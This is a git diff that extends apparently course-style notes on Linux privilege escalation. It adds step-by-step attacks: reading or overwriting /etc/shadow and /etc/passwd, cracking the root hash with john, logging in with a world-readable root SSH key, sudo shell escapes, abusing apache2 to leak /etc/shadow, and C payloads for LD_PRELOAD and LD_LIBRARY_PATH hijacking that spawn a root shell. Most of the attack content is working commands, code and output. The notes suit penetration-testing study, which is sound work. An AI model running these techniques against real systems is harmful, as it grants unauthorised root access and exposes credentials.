@@ -61,7 +61,23 @@ Hacking linux
   - [Services Running as Root](#Services-Running-as-Root)
   - [Enumerating Program Versions](#Enumerating-Program-Versions)
   - [Port Forwarding](#Port-Forwarding)
-- [Weak File Permissions](#Weak-File-Permissions)
+- [Weak File Permissions 1](#Weak-File-Permissions-1)
+  - [Useful Commands](#Useful-Commands)
+  - [Backups](#Backups)
+- [sudo](#sudo)
+  - [What is sudo](#What-is-sudo)
+  - [Useful sudo Commands](#Useful-sudo-Commands)
+  - [Known Password](#Known-Password)
+  - [Other Methods](#Other-Methods)
+  - [Shell Escape Sequences](#Shell-Escape-Sequences)
+  - [Abusing Intended Functionality](#Abusing-Intended-Functionality)
+  - [Environment Variables](#Environment-Variables)
+  - [LD_PRELOAD](#LD-_-PRELOAD)
+    - [Limitations](#Limitations)
+  - [LD_LIBRARY_PATH](#LD-_-LIBRARY-_-PATH)
+- [Cron Jobs](#Cron-Jobs)
+  
+  
 -------------------------------------------------------------------------------------------------------------------------------------------------------
 - [Linux Privilige Escalation 1](#Linux-Privilige-Escalation-1)
   - [Automated Enumeration Tools](#Automated-Enumeration-Tools)
@@ -879,9 +895,7 @@ Drop back to our regular shell, and run /tmp/rootbash for a root shell:
 ```
 $ /tmp/rootbash -p
 rootbash-4.1# id
-uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root
-),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(u
-ser)
+uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
 ```
 
 ### Port Forwarding
@@ -893,7 +907,471 @@ $ ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>
 The exploit code can now be run on your local machine at whichever
 port you chose.
   
-## Weak File Permissions
+## Weak File Permissions 1
+
+Certain system files can be taken advantage of to perform
+privilege escalation if the permissions on them are too weak.
+If a system file has confidential information we can read, it may
+be used to gain access to the root account.
+If a system file can be written to, we may be able to modify the
+way the operating system works and gain root access that way.
+
+### Useful Commands
+Find all writable files in /etc:
+```
+$ find /etc -maxdepth 1 -writable -type f
+
+```
+Find all readable files in /etc:
+```
+$ find /etc -maxdepth 1 -readable -type f
+```
+Find all directories which can be written to:
+```
+$ find / -executable -writable -type d 2> /dev/null
+```
+
+### /etc/shadow
+The /etc/shadow file contains user password hashes, and by
+default is not readable by any user except for root.
+If we are able to read the contents of the /etc/shadow file, we
+might be able to crack the root user’s password hash.
+If we are able to modify the /etc/shadow file, we can replace
+the root user’s password hash with one we know.
+
+### Privilege Escalation
+1. Check the permissions of the /etc/shadow file:
+```
+$ ls -l /etc/shadow
+-rw-r—rw- 1 root shadow 810 May 13 2017 /etc/shadow
+```
+Note that it is world readable.
+2. Extract the root user’s password hash:
+```
+$ head -n 1 /etc/shadow
+root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
+```
+
+3.
+Save the password hash in a file (e.g. hash.txt):
+```
+$ echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt'
+```
+4.
+Crack the password hash using john:
+$ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+...
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+password123 (?)
+```
+5. Use the su command to switch to the root user,
+entering the password we cracked when prompted:
+```
+$ su
+Password:
+root@debian:/# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+### Privilege Escalation (#2)
+1. Check the permissions of the /etc/shadow file:
+```
+$ ls -l /etc/shadow
+-rw-r—rw- 1 root shadow 810 May 13 2017 /etc/shadow
+```
+Note that it is world writable.
+2. Copy / save the contents of /etc/shadow so we can
+restore it later.
+
+3. Generate a new SHA-512 password hash:
+```
+$ mkpasswd -m sha-512 newpassword
+$6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoOlL9VEWwO/okK3vi1IdVaO9.xt4IQMY4OUj/
+```
+4. Edit the /etc/shadow and replace the root user’s
+password hash with the one we generated.
+```
+root:$6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoOlL9VEWwO/okK3vi1IdVaO9.xt4IQMY4OUj/:17298:0:99999:7:::
+```
+
+5. Use the su command to switch to the root user,
+entering the new password when prompted:
+```
+$ su
+Password:
+root@debian:/# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+### /etc/passwd
+The /etc/passwd historically contained user password hashes.
+For backwards compatibility, if the second field of a user row in /etc/passwd
+contains a password hash, it takes precedent over the hash in /etc/shadow.
+If we can write to /etc/passwd, we can easily enter a known password hash for
+the root user, and then use the su command to switch to the root user.
+Alternatively, if we can only append to the file, we can create a new user but
+assign them the root user ID (0). This works because Linux allows multiple entries
+for the same user ID, as long as the usernames are different.
+
+The root account in /etc/passwd is usually configured like this:
+```
+root:x:0:0:root:/root:/bin/bash
+```
+The “x” in the second field instructs Linux to look for the password hash
+in the /etc/shadow file.
+In some versions of Linux, it is possible to simply delete the “x”, which
+Linux interprets as the user having no password:
+```
+root::0:0:root:/root:/bin/bash
+```
+
+### Privilege Escalation
+1.
+Check the permissions of the /etc/passwd file:
+```
+$ ls -l /etc/passwd
+-rw-r--rw- 1 root root 951 May 13 2017 /etc/passwd
+```
+Note that it is world writable.
+2.
+Generate a password hash for the password “password”
+using openssl:
+```
+$ openssl passwd "password" 
+L9yLGxncbOROc
+```
+3. Edit the /etc/passwd file and enter the hash in the
+second field of the root user row:
+```
+root:L9yLGxncbOROc:0:0:root:/root:/bin/bash
+```
+4. Use the su command to switch to the root user:
+```
+$ su
+Password:
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+5. Alternatively, append a new row to /etc/passwd to
+create an alternate root user (e.g. newroot):
+```
+newroot:L9yLGxncbOROc:0:0:root:/root:/bin/bash
+```
+6. Use the su command to switch to the newroot user:
+```
+$ su newroot
+Password:
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+## Backups
+Even if a machine has correct permissions on important or
+sensitive files, a user may have created insecure backups of
+these files.
+It is always worth exploring the file system looking for readable
+backup files. Some common places include user home
+directories, the / (root) directory, /tmp, and /var/backups.
+
+### Privilege Escalation
+1.
+Look for interesting files, especially hidden files, in common
+locations:
+```
+$ ls -la /home/user
+$ ls -la /
+$ ls -la /tmp
+$ ls -la /var/backups
+```
+2.
+Note that a hidden .ssh directory exists in the system root:
+```
+$ ls -la /
+drwxr-xr-x 2 root root 4096 Aug 24 18:57 .ssh
+```
+
+3.
+In this directory, we can see a world-readable file called root_key:
+```
+$ ls -l /.ssh
+total 4 -rw-r--r-- 1 root root 1679 Aug 24 18:57 root_key
+```
+4.
+Further inspection of this file seems to indicate that this is an SSH private
+key. The name and owner of the file suggests this key belongs to the root
+user:
+```
+$ head -n 1 /.ssh/root_key
+-----BEGIN RSA PRIVATE KEY-----
+```
+
+5.
+Before we try to use this key, let’s confirm that root logins are even
+allowed via SSH:
+```
+$ grep PermitRootLogin /etc/ssh/sshd_config
+PermitRootLogin yes
+```
+6.
+Copy the key over to your local machine, and give it correct
+permissions (otherwise SSH will refuse to use it):
+```
+# chmod 600 root_key
+```
+
+7. Use the key to SSH to the target as the root account:
+```
+# ssh -i root_key root@192.168.1.25
+```
+
+## sudo
+
+### What is sudo
+What is sudo?
+sudo is a program which lets users run other programs with the security
+privileges of other users. By default, that other user will be root.
+A user generally needs to enter their password to use sudo, and they
+must be permitted access via rule(s) in the /etc/sudoers file.
+Rules can be used to limit users to certain programs, and forgo the
+password entry requirement.
+
+### Useful sudo Commands
+Run a program using sudo:
+```
+$ sudo <program>
+```
+Run a program as a specific user:
+```
+$ sudo –u <username> <program>
+```
+List programs a user is allowed (and disallowed) to run:
+```
+$ sudo -l
+```
+
+### Known Password
+By far the most obvious privilege escalation with sudo is to use sudo as it
+was intended!
+If your low privileged user account can use sudo unrestricted (i.e. you can
+run any programs) and you know the user’s password, privilege escalation
+is easy, by using the “switch user” (su) command to spawn a root shell:
+```
+$ sudo su
+```
+
+### Other Methods
+If for some reason the su program is not allowed, there are many other
+ways to escalate privileges:
+```
+$ sudo -s
+$ sudo -i
+$ sudo /bin/bash
+$ sudo passwd
+```
+Even if there are no “obvious” methods for escalating privileges, we may
+be able to use a shell escape sequence.
+
+### Shell Escape Sequences
+Even if we are restricted to running certain programs via sudo, it is
+sometimes possible to “escape” the program and spawn a shell.
+Since the initial program runs with root privileges, so does the
+spawned shell.
+A list of programs with their shell escape sequences can be found
+here: https://gtfobins.github.io/
+
+### Privilege Escalation (Generic)
+1. List the programs your user is allowed to run via
+sudo:
+```
+$ sudo -l
+...
+(root) NOPASSWD: /usr/sbin/iftop
+(root) NOPASSWD: /usr/bin/find
+(root) NOPASSWD: /usr/bin/nano
+(root) NOPASSWD: /usr/bin/vim
+(root) NOPASSWD: /usr/bin/man
+(root) NOPASSWD: /usr/bin/awk
+...
+```
+2. For each program in the list, see if there is a shell
+escape sequence on GTFOBins
+(https://gtfobins.github.io/)
+3.
+If an escape sequence exists, run the program via
+sudo and perform the sequence to spawn a root
+shell.
+
+### Abusing Intended Functionality
+If a program doesn’t have an escape sequence, it may still be
+possible to use it to escalate privileges.
+If we can read files owned by root, we may be able to extract
+useful information (e.g. passwords, hashes, keys).
+If we can write to files owned by root, we may be able to insert
+or modify information.
+
+### Privilege Escalation
+1.
+List the programs your user is allowed to run via sudo:
+```
+$ sudo -l
+...
+(root) NOPASSWD: /usr/sbin/apache2
+```
+Note that apache2 is in the list.
+2.
+apache2 doesn’t have any known shell escape
+sequences, however when parsing a given config file, it
+will error and print any line it doesn’t understand.
+3. Run apache2 using sudo, and provide it the
+/etc/shadow file as a config file:
+```
+$ sudo apache2 -f /etc/shadow
+Syntax error on line 1 of /etc/shadow:
+Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7::
+:', perhaps misspelled or defined by a module not included in the server configuration
+```
+4. Extract the root user’s hash from the file.
+5.
+Save the password hash in a file (e.g. hash.txt):
+```
+$ echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt'
+```
+6.
+Crack the password hash using john:
+```
+$ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+...
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+password123 (?)
+```
+7. Use the su command to switch to the root user,
+entering the password we cracked when prompted:
+```
+$ su
+Password:
+root@debian:/# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+### Environment Variables
+Programs run through sudo can inherit the environment variables
+from the user’s environment.
+In the /etc/sudoers config file, if the env_reset option is set, sudo
+will run programs in a new, minimal environment.
+The env_keep option can be used to keep certain environment
+variables from the user’s environment.
+The configured options are displayed when running sudo -l
+
+### LD_PRELOAD
+LD_PRELOAD is an environment variable which can be set to
+the path of a shared object (.so) file.
+When set, the shared object will be loaded before any others.
+By creating a custom shared object and creating an init()
+function, we can execute code as soon as the object is loaded.
+
+### Limitations
+LD_PRELOAD will not work if the real user ID is different
+from the effective user ID.
+sudo must be configured to preserve the LD_PRELOAD
+environment variable using the env_keep option.
+
+### Privilege Escalation
+1. List the programs your user is allowed to run via
+sudo:
+```
+$ sudo -l
+```
+Matching Defaults entries for user on this host:
+env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+...
+Note that the env_keep option includes the
+LD_PRELOAD environment variable.
+
+
+2. Create a file (preload.c) with the following contents:
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+  unsetenv("LD_PRELOAD");
+  setresuid(0,0,0);
+  system("/bin/bash -p");
+}
+```
+3.
+Compile preload.c to preload.so:
+```
+$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
+```
+4.
+Run any allowed program using sudo, while setting the
+LD_PRELOAD environment variable to the full path of the
+preload.so file:
+```
+$ sudo LD_PRELOAD=/tmp/preload.so apache2
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+### LD_LIBRARY_PATH
+The LD_LIBRARY_PATH environment variable contains a set of directories where
+shared libraries are searched for first.
+The ldd command can be used to print the shared libraries used by a program:
+$ ldd /usr/sbin/apache2
+By creating a shared library with the same name as one used by a program, and
+setting LD_LIBRARY_PATH to its parent directory, the program will load our
+shared library instead.
+
+### Privilege Escalation
+1.
+Run ldd against the apache2 program file:
+```
+$ ldd /usr/sbin/apache2
+linux-vdso.so.1 => (0x00007fff063ff000)
+...
+  libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f7d4199d000)
+  libdl.so.2 => /lib/libdl.so.2 (0x00007f7d41798000)
+  libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f7d41570000)
+  /lib64/ld-linux-x86-64.so.2 (0x00007f7d42e84000)
+```
+Hijacking shared objects using this method is hit or miss. Choose one from
+the list and try it (libcrypt.so.1 seems to work well).
+
+2.
+Create a file (library_path.c) with the following contents:
+```
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+  unsetenv("LD_LIBRARY_PATH");
+  setresuid(0,0,0);
+  system("/bin/bash -p");
+}
+```
+
+3.
+Compile library_path.c into libcrypt.so.1:
+```
+$ gcc -o libcrypt.so.1 -shared -fPIC library_path.c
+```
+4.
+Run apache2 using sudo, while setting the
+LD_LIBRARY_PATH environment variable to the current
+path (where we compiled library_path.c):
+```
+$ sudo LD_LIBRARY_PATH=. apache2
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+### Cron Jobs
 ---------------------------------------------------------------------------------------------------------------------------------------------------------
 
 ## Linux Privilige Escalation 1
